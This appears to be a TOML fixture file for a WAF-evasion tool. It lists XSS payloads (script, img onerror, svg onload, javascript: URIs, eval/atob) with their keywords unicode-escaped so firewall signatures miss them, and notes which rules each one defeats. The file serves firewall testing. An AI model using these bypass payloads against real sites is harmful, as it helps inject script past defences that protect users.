schema = 1
# XSS payloads pre-encoded with the `json_unicode_alnum` tamper. The HTML
# structural chars (`<`, `>`, `(`, `)`, `=`, `"`, `'`) stay bare so the
# browser still parses the markup; only the alphanumeric identifiers
# (`script`, `alert`, `onerror`, `img`, `src`) are `\uXXXX`-escaped.
#
# Delivery vector: any sink that runs JS-string-literal decoding before
# rendering (innerHTML via JSON.parse, JS `${...}` template interpolation,
# server-side `String.raw` patterns, attribute setters with eval-shaped
# decode). Many SPAs that consume JSON config blobs hit exactly this path.
#
# Manual form:
#   wafrift evade --only tamper/json_unicode_alnum --payload "<script>alert(1)</script>"

[[case]]
id = "json_unicode_alnum_script_alert"
class = "xss"
payload = "<\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074>\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031)</\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074>"
description = "Classic `<script>alert(1)</script>` — tag names and function name escaped. CRS 941160-family (XSS keyword) rules match `script` byte-pattern; this is invisible to them."

[[case]]
id = "json_unicode_alnum_img_onerror"
class = "xss"
payload = "<\\u0069\\u006D\\u0067 \\u0073\\u0072\\u0063=\\u0078 \\u006F\\u006E\\u0065\\u0072\\u0072\\u006F\\u0072=\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031)>"
description = "`<img src=x onerror=alert(1)>` — tag, attribute name, handler, function all escaped. Defeats both keyword-list rules AND event-handler regexes (`on\\w+\\s*=`)."

[[case]]
id = "json_unicode_alnum_svg_onload"
class = "xss"
payload = "<\\u0073\\u0076\\u0067 \\u006F\\u006E\\u006C\\u006F\\u0061\\u0064=\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031)>"
description = "`<svg onload=alert(1)>` — the SVG vector that bypasses many HTML5 filters. Tag and handler escaped."

[[case]]
id = "json_unicode_alnum_iframe_javascript_uri"
class = "xss"
payload = "<\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065 \\u0073\\u0072\\u0063=\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074:\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031)>"
description = "`<iframe src=javascript:alert(1)>` — the `javascript:` URI scheme keyword (high-confidence WAF signature) escaped. The `:` stays bare for parser clarity."

[[case]]
id = "json_unicode_alnum_event_handler_div"
class = "xss"
payload = "<\\u0064\\u0069\\u0076 \\u006F\\u006E\\u006D\\u006F\\u0075\\u0073\\u0065\\u006F\\u0076\\u0065\\u0072=\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031)>\\u0068\\u006F\\u0076\\u0065\\u0072</\\u0064\\u0069\\u0076>"
description = "`<div onmouseover=alert(1)>hover</div>` — handler chosen to defeat narrow event-name lists (some rules only target `onclick`/`onerror`/`onload`)."

[[case]]
id = "json_unicode_alnum_object_data"
class = "xss"
payload = "<\\u006F\\u0062\\u006A\\u0065\\u0063\\u0074 \\u0064\\u0061\\u0074\\u0061=\\u0064\\u0061\\u0074\\u0061:\\u0074\\u0065\\u0078\\u0074\\u002F\\u0068\\u0074\\u006D\\u006C,<\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074>\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031)</\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074>>"
description = "`<object data=data:text/html,<script>...>` — the data-URI XSS vector with nested escape. `data:` MIME and inner `<script>` both invisible to byte regex."

[[case]]
id = "json_unicode_alnum_style_expression"
class = "xss"
payload = "<\\u0064\\u0069\\u0076 \\u0073\\u0074\\u0079\\u006C\\u0065=\\u0065\\u0078\\u0070\\u0072\\u0065\\u0073\\u0073\\u0069\\u006F\\u006E(\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031))>"
description = "IE-style CSS expression XSS — `expression()` is a high-confidence WAF token; here it's `\\u0065\\u0078\\u0070\\u0072\\u0065\\u0073\\u0073\\u0069\\u006F\\u006E`."

[[case]]
id = "json_unicode_alnum_audio_video"
class = "xss"
payload = "<\\u0061\\u0075\\u0064\\u0069\\u006F \\u0073\\u0072\\u0063 \\u006F\\u006E\\u006C\\u006F\\u0061\\u0064\\u0073\\u0074\\u0061\\u0072\\u0074=\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031)>"
description = "`<audio src onloadstart=alert(1)>` — modern media-tag handler (added HTML5). WAFs with older event lists miss `onloadstart`."

[[case]]
id = "json_unicode_alnum_form_action_javascript"
class = "xss"
payload = "<\\u0066\\u006F\\u0072\\u006D \\u0061\\u0063\\u0074\\u0069\\u006F\\u006E=\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074:\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031)><\\u0069\\u006E\\u0070\\u0075\\u0074 \\u0074\\u0079\\u0070\\u0065=\\u0073\\u0075\\u0062\\u006D\\u0069\\u0074>"
description = "Form-action XSS — submit a form to a `javascript:` URI. The keyword `action=javascript:` is heavily fingerprinted; here all alphas escaped."

[[case]]
id = "json_unicode_alnum_marquee_onstart"
class = "xss"
payload = "<\\u006D\\u0061\\u0072\\u0071\\u0075\\u0065\\u0065 \\u006F\\u006E\\u0073\\u0074\\u0061\\u0072\\u0074=\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031)>"
description = "`<marquee onstart=alert(1)>` — legacy deprecated tag still rendered by browsers, often missed by modern WAF rule sets."

[[case]]
id = "json_unicode_alnum_xss_with_string_split"
class = "xss"
payload = "<\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074>\\u0065\\u0076\\u0061\\u006C(\\u0061\\u0074\\u006F\\u0062('\\u0059\\u0057\\u0078\\u006C\\u0063\\u006E\\u0051\\u006F\\u004D\\u0053\\u006B='))</\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074>"
description = "Multi-layer: eval+atob+base64('alert(1)') with the wrapper keywords escaped. The high-confidence `eval(atob(` signature stays invisible."

[[case]]
id = "json_unicode_alnum_xss_idempotent_passthrough"
class = "xss"
payload = "<\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074>"
description = "Negative-case: payload already partially encoded. Idempotency requirement: re-running the tamper produces no further change."
